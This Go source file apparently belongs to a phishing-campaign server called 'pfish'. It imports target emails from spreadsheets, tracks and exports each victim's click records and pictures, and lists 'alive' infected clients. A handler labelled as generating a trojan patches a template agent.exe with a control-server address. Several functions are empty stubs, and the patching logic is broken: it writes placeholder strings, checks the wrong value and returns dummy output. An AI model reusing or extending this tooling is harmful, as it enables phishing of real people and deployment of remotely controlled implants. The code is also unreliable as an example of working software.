package service

import (
	"bytes"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/pow1e/pfish/config"
	"github.com/pow1e/pfish/pkg/database"
	"github.com/pow1e/pfish/pkg/file"
	"github.com/pow1e/pfish/pkg/model"
	"github.com/pow1e/pfish/pkg/model/common"
	"github.com/pow1e/pfish/pkg/model/request"
	"github.com/pow1e/pfish/pkg/model/response"
	"github.com/pow1e/pfish/pkg/utils"
	"github.com/sirupsen/logrus"
	"github.com/xuri/excelize/v2"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

const (
	errCode     = 500
	successCode = 200

	errMD5Message = "邮箱md5错误/md5不存在"
)

const (
	grpcServer = "exmpaleGrpcServerAddressABCDEFGH"
	md5        = "exampleMD51234567891234567891234"
)

// GetMessage 根据邮箱md5(2次) 获取当前用户所有点击记录
func GetMessage(c *gin.Context) {
	// 32位小数
	md5String := c.Param("md5")
	pageString := c.DefaultQuery("page", "1")
	pageSizeString := c.DefaultQuery("pageSize", "50")

	// 转换分页参数为整数
	page, err := strconv.Atoi(pageString)
	if err != nil || page < 1 {
		page = 1 // 如果页码参数不合法，则默认为第1页
	}

	pageSize, err := strconv.Atoi(pageSizeString)
	if err != nil || pageSize < 1 {
		pageSize = 50 // 如果每页数量不合法，则默认为50
	}

	if md5String == "" {
		// md5值为空
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  errMD5Message,
		})
		return
	}

	logrus.Info("获取到md5", md5String)

	// 查询md5值是否存在
	var user *model.User
	user, err = database.FindUserByEmailMD5(md5String)
	if err != nil {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  err.Error(),
		})
		return
	}

	// 查询message
	var messages []*model.Message
	// 计算偏移量
	offset := (page - 1) * pageSize
	messages, err = database.FindMessageByUidPage(user.ID, offset, pageSize)
	if err != nil {
		// 查询邮箱点击信息出错
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  err.Error(),
		})
		return
	}

	var respMessage string
	if len(messages) == 0 {
		respMessage = "暂无点击信息，请耐心等待~"
	} else {
		respMessage = fmt.Sprintf("查询成功，返回当前邮箱%s点击信息，注意图片路径不要随便乱传(每个图片路径携带唯一标识，不存在未授权访问)", user.Email)
	}

	// 动态替换pass
	for i, message := range messages {
		messages[i].Picture = strings.Replace(
			message.Picture,
			"{pass}",
			config.Conf.Server.Pass,
			-1, // 替换所有匹配的 `{pass}`
		)
	}

	c.JSON(http.StatusOK, &response.Response{
		Code: successCode,
		Msg:  respMessage,
		Data: gin.H{
			"message":  messages,
			"count":    len(messages),
			"page":     page,
			"pageSize": pageSize,
		},
	})
}

// ImportExcel 导入excel 并且解析到数据库
func ImportExcel(c *gin.Context) {
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "上传文件失败",
		})
		return
	}
	// 获取文件名
	if path.Ext(file.Filename) != ".xlsx" {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "上传文件失败，只能上传xlsx后缀的文件",
		})
		return
	}

	// 保存文件到临时目录
	tempFile := filepath.Join(os.TempDir(), file.Filename)
	if err := c.SaveUploadedFile(file, tempFile); err != nil {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "保存文件失败",
		})
		return
	}
	defer os.Remove(tempFile)

	// 打开 Excel 文件
	f, err := excelize.OpenFile(tempFile)
	if err != nil {
		logrus.Errorf("打开 Excel 文件失败: %v", err)
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "解析文件失败，请上传正确的 Excel 文件",
		})
		return
	}

	// 提取所有邮件地址
	var emails []string
	re := regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)

	// 遍历所有 Sheet 和单元格
	for _, sheet := range f.GetSheetList() {
		rows, err := f.GetRows(sheet)
		if err != nil {
			logrus.Errorf("读取 Sheet '%s' 失败: %v", sheet, err)
			continue
		}
		for _, row := range rows {
			for _, cell := range row {
				if re.MatchString(cell) {
					emails = append(emails, cell)
				}
			}
		}
	}

	// 返回结果
	if len(emails) == 0 {
		c.JSON(http.StatusOK, &response.Response{
			Code: http.StatusOK,
			Msg:  "未找到任何邮件地址",
		})
		return
	}

	// 写入数据库
	users := make([]*model.User, 0)
	for _, email := range emails {
		users = append(users, &model.User{
			ID:    uuid.NewString(),
			Name:  strings.Split(email, "@")[0], // 以邮箱@前面作为姓名
			Email: email,
			MD5:   utils.MD5(utils.MD5(email) + config.Conf.Server.Salt), // 两次md5
		})
	}

	if err := database.DB.CreateInBatches(users, 100).Error; err != nil {
		logrus.Error("批量插入数据错误:", err)
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "批量新增用户出错，请删除数据后重试",
		})
		return
	}

	c.JSON(http.StatusOK, &response.Response{
		Code: http.StatusOK,
		Msg:  "解析文件成功",
		Data: gin.H{
			"emails": emails,
			"count":  len(emails),
		},
	})

}

// ExportMessage 导出用户点击信息
// email为邮件md5两次的结果
func ExportMessage(c *gin.Context) {
	emailMD5 := c.DefaultQuery("emailMD5", "")
	// 根据邮箱导出
	if emailMD5 != "" {
		// 查询出当前的id
		user, err := database.FindUserByEmailMD5(emailMD5)
		if err != nil {
			c.JSON(http.StatusOK, &response.Response{
				Code: errCode,
				Msg:  err.Error(),
			})
			return
		}
		// 根据id查询message
		messages, err := database.FindAllMessagesByUid(user.ID)
		if err != nil {
			c.JSON(http.StatusOK, &response.Response{
				Code: errCode,
				Msg:  err.Error(),
			})
			return
		}
		// 动态修改pass
		for i, message := range messages {
			messages[i].Picture = strings.Replace(
				message.Picture,
				"{pass}",
				config.Conf.Server.Pass,
				-1, // 替换所有匹配的 `{pass}`
			)
		}
		file.OutputMessagesToExcel(c, messages, user.Email)
		return
	}

	// 导出所有
	var messages []*model.Message
	if err := database.DB.Find(&messages).Error; err != nil {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "查询所有用户点击信息出错",
		})
		return
	}

	// 动态替换pass
	for i, message := range messages {
		messages[i].Picture = strings.Replace(
			message.Picture,
			"{pass}",
			config.Conf.Server.Pass,
			-1, // 替换所有匹配的 `{pass}`
		)
	}

	file.OutputMessagesToExcel(c, messages)
}

func SendEmail(c *gin.Context) {

}

func Alive(c *gin.Context) {
	// 获取路径参数 md5
	md5String := c.Param("md5")

	if md5String != "" {
		md5String = md5String[1:] // 去掉开头的斜杠
	}

	// 获取存活客户端
	clients := common.GlobalAliveUsers.GetClients()
	var aliveResp = make(map[string]string)

	// 如果未传 md5 参数，返回所有存活客户端
	if md5String == "" {
		for emailMd5 := range clients {
			user, err := database.FindUserByEmailMD5(emailMd5)
			if err != nil {
				logrus.Errorf("查询用户信息出错: %v", err)
				c.JSON(http.StatusOK, &response.Response{
					Code: errCode,
					Msg:  err.Error(),
				})
				return
			}
			aliveResp[user.Name] = user.Email
		}
		c.JSON(http.StatusOK, &response.Response{
			Code: successCode,
			Msg:  "获取存活客户端成功",
			Data: gin.H{
				"count":   len(aliveResp), // 客户端数量
				"clients": aliveResp,      // 客户端详情
			},
		})
		return
	}

	// 如果传了 md5 参数，查询对应客户端
	client, exists := clients[md5String]
	if !exists {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "探活失败，未找到该客户端",
		})
		return
	}

	// 返回单个客户端的信息
	user, err := database.FindUserByEmailMD5(md5String)
	if err != nil {
		logrus.Errorf("查询用户信息出错: %v", err)
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  err.Error(),
		})
		return
	}
	c.JSON(http.StatusOK, &response.Response{
		Code: successCode,
		Msg:  "探活成功",
		Data: gin.H{
			"active": client.Active,
			"user":   user.Name,
			"email":  user.Email,
		},
	})
}

// GenerateAgent 生成木马
func GenerateAgent(c *gin.Context) {
	// 默认不使用模板
	var req request.GenerateAgentReq
	if err := c.ShouldBind(&req); err != nil {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "参数错误",
		})
		return
	}
	// 判断grpc服务是否为空 如果为则使用配置文件中的
	if req.GrpcServerAddr == "" {
		req.GrpcServerAddr = fmt.Sprintf("%s:%s", config.Conf.Server.IP, config.Conf.Server.GRPC.Port)
	}

	// 使用模板则直接修改
	if req.UseTemplate {
		if err := generateWithTemplate(&req); err != nil {
			c.JSON(http.StatusOK, &response.Response{
				Code: errCode,
				Msg:  err.Error(),
			})
			return
		}
		return
	}

	// todo 添加多个上线模板
	// 判断平台
	if req.Platform != "windows" && req.Platform != "linux" && req.Platform != "darwin" {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "参数错误",
		})
		return
	}
	if req.Arch != "x86" {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  "参数错误",
		})
		return
	}
	if err := generate(&req); err != nil {
		c.JSON(http.StatusOK, &response.Response{
			Code: errCode,
			Msg:  err.Error(),
		})
		return
	}

	c.Data(http.StatusOK, "application/octet-stream", []byte("hello"))
}

func generateWithTemplate(req *request.GenerateAgentReq) error {
	// 读取模板文件
	data, err := os.ReadFile("./template/agent.exe")
	if err != nil {
		logrus.Error("读取/template/agent.go失败:", err)
		return err
	}
	// 判断传入的字符串是否超过32位
	if err = utils.CheckByteLength([]byte(grpcServer), []byte(req.GrpcServerAddr)); err != nil {
		return err
	}
	if err = utils.CheckByteLength([]byte(md5), []byte(req.GrpcServerAddr)); err != nil {
		return err
	}

	data = bytes.Replace(data, []byte(grpcServer), []byte("xxxxx"), -1)
	data = bytes.Replace(data, []byte(md5), []byte("xxxxxx"), -1)
	// 生成新的文件路径
	newExeFilePath := "example_modified.exe"

	// 写入新的 exe 文件
	err = ioutil.WriteFile(newExeFilePath, data, 0644)
	if err != nil {
		log.Fatalf("无法写入文件: %v", err)
	}

	fmt.Printf("替换成功，生成新的 exe 文件: %s\n", newExeFilePath)
	return nil
}

func generate(req *request.GenerateAgentReq) error {
	return nil
}

// CreateAgentConfig 创建马子相关配置(打开文件名，文件内容)
func CreateAgentConfig(c *gin.Context) {

}

// UpdateAgentConfig 修改agent相关配置
func UpdateAgentConfig(c *gin.Context) {

}

func DeleteAgentConfig(c *gin.Context) {

}
